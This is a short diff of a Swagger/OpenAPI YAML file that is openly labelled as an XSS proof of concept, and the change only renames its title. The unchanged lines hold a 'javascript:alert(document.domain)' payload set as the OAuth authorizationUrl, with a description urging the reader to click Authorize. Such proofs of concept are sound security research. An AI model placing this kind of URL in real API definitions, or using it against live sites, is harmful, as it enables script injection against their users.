@@ -5,7 +5,7 @@ securityDefinitions:
     authorizationUrl: javascript:alert(document.domain)//
 info:
   version: "0.0.1"
-  title: XSS POC by Prime
+  title: Swagger Polyglot PoC
   description: Please Click Authorize!
 paths:
   paths:
